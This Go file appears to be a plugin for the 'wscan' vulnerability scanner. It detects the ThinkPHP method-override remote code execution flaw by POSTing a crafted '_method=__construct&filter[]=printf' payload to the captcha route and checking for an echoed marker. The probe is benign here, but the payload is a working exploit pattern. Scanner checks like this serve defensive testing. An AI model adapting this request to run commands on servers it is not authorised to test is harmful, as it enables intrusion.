/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package thinkphp

import (
	"context"
	"fmt"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

type MethodRce struct {
}

func (*MethodRce) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start detection thinkphp/rce/method, %s", flow.Request.URL())
			r1 := utils.RandLetters(8)
			r2 := utils.RandLetters(8)
			payload := "_method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]={{r1}}%25%25{{r2}}&get[]=1"
			payload = strings.Replace(payload, "{{r1}}", r1, -1)
			payload = strings.Replace(payload, "{{r2}}", r2, -1)
			reqUrl, err := flow.Request.URL().Parse("/index.php?s=captcha")
			if err != nil {
				logger.Error(err)
				return nil
			}

			req, err := http.NewRequest("POST", reqUrl.String(), strings.NewReader(payload))
			if err != nil {
				logger.Error(err)
				return nil
			}
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				return nil
			}

			if strings.Contains(res.Text, fmt.Sprintf("%s%%%s", r1, r2)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "website",
		Binding: &model.VulnBinding{ID: "thinkphp/rce/method", Plugin: "thinkphp/rce/method", Category: "thinkphp/rce/method", Severity: model.SeverityCritical},
	}
}
